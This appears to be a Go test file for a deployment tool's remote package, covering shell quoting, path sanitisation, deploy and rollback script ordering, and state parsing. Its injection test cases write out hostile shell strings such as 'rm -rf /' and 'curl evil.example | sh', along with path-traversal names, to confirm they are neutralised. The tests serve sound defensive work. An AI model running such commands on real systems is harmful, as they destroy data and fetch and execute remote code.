package remote

import (
	"strings"
	"testing"
)

func TestQuote(t *testing.T) {
	tests := []struct{ in, want string }{
		{"simple", "'simple'"},
		{"", "''"},
		// The injection cases. Each of these, unquoted, would execute a second command.
		{"a; rm -rf /", `'a; rm -rf /'`},
		{"a$(whoami)", `'a$(whoami)'`},
		{"a`id`", "'a`id`'"},
		{"a && curl evil.sh | sh", `'a && curl evil.sh | sh'`},
		{"with space", "'with space'"},
		// A single quote must be escaped, not merely wrapped.
		{"it's", `'it'\''s'`},
		{"a\nb", "'a\nb'"},
	}
	for _, tc := range tests {
		if got := Quote(tc.in); got != tc.want {
			t.Errorf("Quote(%q) = %s, want %s", tc.in, got, tc.want)
		}
	}
}

func TestSafePath(t *testing.T) {
	tests := []struct {
		name    string
		base    string
		want    string
		wantErr bool
	}{
		{name: "myapp", base: "/srv/sail", want: "/srv/sail/myapp"},
		{name: "my-app", base: "/srv/sail", want: "/srv/sail/my-app"},
		{name: "trailing-slash", base: "/srv/sail/", want: "/srv/sail/trailing-slash"},
		// Path traversal and option injection must be refused: the name reaches a shell.
		{name: "../etc", base: "/srv/sail", wantErr: true},
		{name: "a/b", base: "/srv/sail", wantErr: true},
		{name: `a\b`, base: "/srv/sail", wantErr: true},
		{name: "..", base: "/srv/sail", wantErr: true},
		{name: ".", base: "/srv/sail", wantErr: true},
		{name: "--rm", base: "/srv/sail", wantErr: true},
		{name: "", base: "/srv/sail", wantErr: true},
	}
	for _, tc := range tests {
		got, err := SafePath(tc.base, tc.name)
		if tc.wantErr {
			if err == nil {
				t.Errorf("SafePath(%q, %q) = %q, want error", tc.base, tc.name, got)
			}
			continue
		}
		if err != nil {
			t.Errorf("SafePath(%q, %q): %v", tc.base, tc.name, err)
			continue
		}
		if got != tc.want {
			t.Errorf("SafePath(%q, %q) = %q, want %q", tc.base, tc.name, got, tc.want)
		}
	}
}

func TestLayoutPaths(t *testing.T) {
	l := Layout{Root: "/srv/sail", App: "api"}
	tests := map[string]string{
		l.Dir():             "/srv/sail/api",
		l.CurrentTagPath():  "/srv/sail/api/.tag",
		l.PreviousTagPath(): "/srv/sail/api/.tag.prev",
		l.EnvPath():         "/srv/sail/api/.env",
		l.ComposePath():     "/srv/sail/api/compose.yaml",
		l.LogPath():         "/srv/sail/api/deploy.log",
	}
	for got, want := range tests {
		if got != want {
			t.Errorf("path = %q, want %q", got, want)
		}
	}
}

// TestEnvTagIsActuallyReadByCompose guards a real bug: the tag is written to a separate
// override file, so every compose invocation must pass it. If the override is not in the
// command, compose silently deploys whatever tag the compose file pins.
func TestEnvTagIsActuallyReadByCompose(t *testing.T) {
	l := Layout{Root: "/srv/sail", App: "api"}
	tagFile := l.TagEnvPath()

	for _, script := range []struct {
		name string
		body string
	}{
		{"DeployScript", DeployScript(l, "abc123")},
		{"RollbackScript", RollbackScript(l, "def456")},
	} {
		if !strings.Contains(script.body, tagFile) {
			t.Errorf("%s does not reference the tag override file %s:\n%s",
				script.name, tagFile, script.body)
		}
		// Every compose call in the script must receive the override.
		for _, part := range strings.Split(script.body, "&&") {
			if strings.Contains(part, "docker compose") && !strings.Contains(part, tagFile) {
				t.Errorf("%s has a compose call without the tag override: %s", script.name, part)
			}
		}
	}
}

func TestDeployScriptOrdering(t *testing.T) {
	l := Layout{Root: "/srv/sail", App: "api"}
	script := DeployScript(l, "sha123")

	// Locate the write, not the --env-file mentions (which appear in every compose call).
	writeTag := strings.Index(script, "> "+Quote(l.TagEnvPath()))
	pull := strings.Index(script, "pull")
	up := strings.Index(script, "up -d --wait")

	// Pull before stop/start: a registry failure must not take down the running app.
	if pull < 0 || writeTag < 0 || up < 0 {
		t.Fatalf("script missing a stage: %s", script)
	}
	if !(writeTag < pull && pull < up) {
		t.Errorf("expected tag -> pull -> up ordering, got indexes tag=%d pull=%d up=%d in:\n%s",
			writeTag, pull, up, script)
	}
	if !strings.Contains(script, "--wait") {
		t.Error("deploy must gate on --wait; without it there is no health signal")
	}
}

func TestPromoteScriptWritesPreviousFirst(t *testing.T) {
	l := Layout{Root: "/srv/sail", App: "api"}
	script := PromoteScript(l, "sha-new")

	prev := strings.Index(script, l.PreviousTagPath())
	curr := strings.Index(script, "> "+Quote(l.CurrentTagPath()))

	if prev < 0 || curr < 0 {
		t.Fatalf("script missing a write: %s", script)
	}
	// Previous must be recorded before current is overwritten, or an interruption between
	// the two loses the rollback target.
	if prev > curr {
		t.Errorf("previous tag must be written before current is replaced:\n%s", script)
	}
}

func TestParseState(t *testing.T) {
	tests := []struct {
		name string
		out  string
		want State
	}{
		{
			name: "fully populated",
			out:  "current=sha1\nprevious=sha0\ncompose=yes\nenv=yes\n",
			want: State{CurrentTag: "sha1", PreviousTag: "sha0", HasCompose: true, HasEnvFile: true},
		},
		{
			name: "fresh server",
			out:  "current=\nprevious=\ncompose=no\nenv=no\n",
			want: State{},
		},
		{
			name: "first deploy, no previous",
			out:  "current=\nprevious=\ncompose=yes\nenv=yes\n",
			want: State{HasCompose: true, HasEnvFile: true},
		},
		{
			// A shell that printed something unexpected must not be silently ignored.
			name: "unrecognised lines are surfaced",
			out:  "current=sha1\nbash: line 1: warning\ncompose=yes\nenv=yes\n",
			want: State{CurrentTag: "sha1", HasCompose: true, HasEnvFile: true,
				Unrecognised: []string{"bash: line 1: warning"}},
		},
		{
			name: "empty output",
			out:  "",
			want: State{},
		},
	}

	for _, tc := range tests {
		t.Run(tc.name, func(t *testing.T) {
			got := ParseState(tc.out)
			if got.CurrentTag != tc.want.CurrentTag {
				t.Errorf("CurrentTag = %q, want %q", got.CurrentTag, tc.want.CurrentTag)
			}
			if got.PreviousTag != tc.want.PreviousTag {
				t.Errorf("PreviousTag = %q, want %q", got.PreviousTag, tc.want.PreviousTag)
			}
			if got.HasCompose != tc.want.HasCompose {
				t.Errorf("HasCompose = %v, want %v", got.HasCompose, tc.want.HasCompose)
			}
			if got.HasEnvFile != tc.want.HasEnvFile {
				t.Errorf("HasEnvFile = %v, want %v", got.HasEnvFile, tc.want.HasEnvFile)
			}
			if len(got.Unrecognised) != len(tc.want.Unrecognised) {
				t.Errorf("Unrecognised = %v, want %v", got.Unrecognised, tc.want.Unrecognised)
			}
		})
	}
}

func TestStateValidateForDeploy(t *testing.T) {
	tests := []struct {
		name    string
		state   State
		wantErr string
	}{
		{"ready", State{HasCompose: true, HasEnvFile: true}, ""},
		{"no compose file", State{HasEnvFile: true}, "compose.yaml"},
		{"no env file", State{HasCompose: true}, ".env"},
		{"nothing", State{}, "compose.yaml"},
	}
	for _, tc := range tests {
		t.Run(tc.name, func(t *testing.T) {
			err := tc.state.ValidateForDeploy()
			if tc.wantErr == "" {
				if err != nil {
					t.Fatalf("unexpected error: %v", err)
				}
				return
			}
			if err == nil {
				t.Fatalf("expected error containing %q", tc.wantErr)
			}
			if !strings.Contains(err.Error(), tc.wantErr) {
				t.Errorf("error = %v, want it to contain %q", err, tc.wantErr)
			}
		})
	}
}

func TestTargetIsCurrent(t *testing.T) {
	tests := []struct {
		name  string
		state State
		tag   string
		want  bool
	}{
		{"same tag", State{CurrentTag: "sha1"}, "sha1", true},
		{"different tag", State{CurrentTag: "sha1"}, "sha2", false},
		// Nothing deployed yet, so a first deploy is never a redundant one.
		{"nothing deployed", State{}, "sha1", false},
	}
	for _, tc := range tests {
		t.Run(tc.name, func(t *testing.T) {
			if got := tc.state.TargetIsCurrent(tc.tag); got != tc.want {
				t.Errorf("TargetIsCurrent(%q) with current %q = %v, want %v",
					tc.tag, tc.state.CurrentTag, got, tc.want)
			}
		})
	}
}

// TestPreflightRejectsComposeV1 pins a deliberate decision: `docker-compose` (v1) has no
// `up -d --wait`, so accepting it would silently remove the health gate.
func TestPreflightRejectsComposeV1(t *testing.T) {
	script := PreflightScript()
	if !strings.Contains(script, "docker compose version") {
		t.Errorf("preflight must require the compose v2 plugin: %s", script)
	}
	if strings.Contains(script, "docker-compose version") {
		t.Errorf("preflight must not fall back to compose v1, which lacks --wait: %s", script)
	}
}

// TestScriptsDoNotInterpolateRawInput is the injection check for the shell boundary.
func TestScriptsDoNotInterpolateRawInput(t *testing.T) {
	l := Layout{Root: "/srv/sail", App: "api"}
	nasty := "x'; curl evil.example | sh; echo '"

	// A tag reaches WriteEnvTag. It is quoted, so the payload stays a literal string.
	write := WriteEnvTag(l, nasty)
	if strings.Contains(write, nasty) {
		t.Errorf("tag was interpolated unquoted into: %s", write)
	}
	if !strings.Contains(write, "'x'\\''; curl evil.example | sh; echo '\\'''") {
		t.Errorf("tag should appear as a quoted literal, got: %s", write)
	}
}
